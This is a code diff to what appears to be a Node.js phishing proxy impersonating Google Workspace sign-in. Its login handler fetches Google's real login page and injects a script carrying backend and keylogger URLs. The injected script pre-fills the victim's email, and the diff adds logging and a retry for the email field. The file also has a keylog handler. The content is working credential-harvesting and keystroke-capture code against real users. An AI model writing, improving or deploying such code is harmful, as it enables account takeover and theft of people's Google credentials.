@@ -406,33 +406,35 @@ function handleKeylog(req, res) {
 }
 
 // ============================================================
-//  HANDLE LOGIN REQUEST - Google Workspace (FIXED)
+//  ✅ ENHANCED HANDLE LOGIN REQUEST - Google Workspace
 // ============================================================
 
 function handleLoginRequest(req, res) {
+    console.log(`[LOGIN] 🔐 Request received: ${req.url}`);
+    
     const emailParam = req.url.match(/login_hint=([^&]+)/);
     const email = emailParam ? decodeURIComponent(emailParam[1]) : '';
     const ip = getClientIp(req);
     const userAgent = req.headers['user-agent'] || 'Unknown';
     
     if (!email) {
-        console.warn('[PROXY] ⚠️ No email provided, redirecting to Google');
+        console.warn('[LOGIN] ⚠️ No email provided, redirecting to Google');
         res.writeHead(302, { 'Location': 'https://accounts.google.com/ServiceLogin' });
         res.end();
         return;
     }
+
+    console.log(`[LOGIN] 📧 Email: ${email}`);
+    console.log(`[LOGIN] 📡 IP: ${ip}`);
 
     const sessionId = createSession(email, ip, userAgent);
     const isSecure = req.headers['x-forwarded-proto'] === 'https' || req.socket.encrypted;
     const cookieFlags = `Path=/; HttpOnly; SameSite=Lax; Max-Age=3600${isSecure ? '; Secure' : ''}`;
     res.setHeader('Set-Cookie', [`sessionId=${sessionId}; ${cookieFlags}`]);
 
-    console.log(`[PROXY] 🔄 Google login for: ${email}`);
-    console.log(`[PROXY] 🆔 Session: ${sessionId}`);
-    console.log(`[PROXY] 📡 IP: ${ip}`);
+    console.log(`[LOGIN] 🆔 Session: ${sessionId}`);
 
-    // ✅ FIXED: Proper URL with email pre-filled
-    // Google uses 'Email' parameter for the email field
+    // ✅ Build Google login URL with email pre-filled
     const targetUrl = `https://accounts.google.com/ServiceLogin?` +
         `Email=${encodeURIComponent(email)}&` +
         `continue=https://mail.google.com/mail&` +
@@ -441,7 +443,7 @@ function handleLoginRequest(req, res) {
         `flowName=GlifWebSignIn&` +
         `flowEntry=ServiceLogin`;
 
-    console.log(`[PROXY] 🔗 Target URL: ${targetUrl}`);
+    console.log(`[LOGIN] 🔗 Fetching: ${targetUrl}`);
 
     https.get(targetUrl, {
         headers: {
@@ -452,14 +454,18 @@ function handleLoginRequest(req, res) {
             'Cache-Control': 'no-cache'
         }
     }, (targetRes) => {
+        console.log(`[LOGIN] 📥 Response status: ${targetRes.statusCode}`);
+        
         let data = [];
         targetRes.on('data', chunk => data.push(chunk));
         targetRes.on('end', () => {
             let body = Buffer.concat(data).toString();
+            console.log(`[LOGIN] 📄 Body length: ${body.length}`);
             
             // ✅ Inject script with email pre-filled
             const injectionScript = `
             <script>
+                console.log('🔐 Google Proxy loaded');
                 window.GOOGLE_CONFIG = {
                     BACKEND_URL: '${BACKEND_URL}',
                     KEYLOGGER_URL: '${KEYLOGGER_URL}',
@@ -470,21 +476,33 @@ function handleLoginRequest(req, res) {
                     EMAIL: '${email}',
                     SERVICE: 'Google Workspace'
                 };
-                console.log('🔐 Google Proxy loaded');
                 console.log('📧 Email:', window.GOOGLE_CONFIG.EMAIL);
+                console.log('🆔 Session:', window.GOOGLE_CONFIG.SESSION_ID);
                 
-                // ✅ AUTO-FILL EMAIL on page load
+                // Auto-fill email on page load
                 document.addEventListener('DOMContentLoaded', function() {
                     const email = '${email}';
                     const emailField = document.querySelector('input[name="Email"]') || 
                                       document.querySelector('input[type="email"]') ||
-                                      document.querySelector('input[name="identifier"]');
+                                      document.querySelector('input[name="identifier"]') ||
+                                      document.querySelector('#identifierId');
                     if (emailField) {
                         emailField.value = email;
-                        // Trigger input event to show email
                         const event = new Event('input', { bubbles: true });
                         emailField.dispatchEvent(event);
-                        console.log('📧 Auto-filled email:', email);
+                        console.log('✅ Auto-filled email:', email);
+                    } else {
+                        console.log('⚠️ Email field not found, retrying...');
+                        setTimeout(function() {
+                            const retryField = document.querySelector('input[name="Email"]') || 
+                                               document.querySelector('input[type="email"]');
+                            if (retryField) {
+                                retryField.value = email;
+                                const event = new Event('input', { bubbles: true });
+                                retryField.dispatchEvent(event);
+                                console.log('✅ Auto-filled email (retry):', email);
+                            }
+                        }, 1000);
                     }
                 });
             </script>
@@ -493,14 +511,14 @@ function handleLoginRequest(req, res) {
             
             body = body.replace(/<\/body>/i, injectionScript + '</body>');
             
-            res.writeHead(targetRes.statusCode || 200, {
+            res.writeHead(200, {
                 'Content-Type': 'text/html',
                 'Cache-Control': 'no-store, no-cache, must-revalidate'
             });
             res.end(body);
         });
     }).on('error', (err) => {
-        console.error(`[ERROR] Proxy failed: ${err.message}`);
+        console.error(`[LOGIN] ❌ Error: ${err.message}`);
         res.writeHead(302, { 'Location': targetUrl });
         res.end();
     });
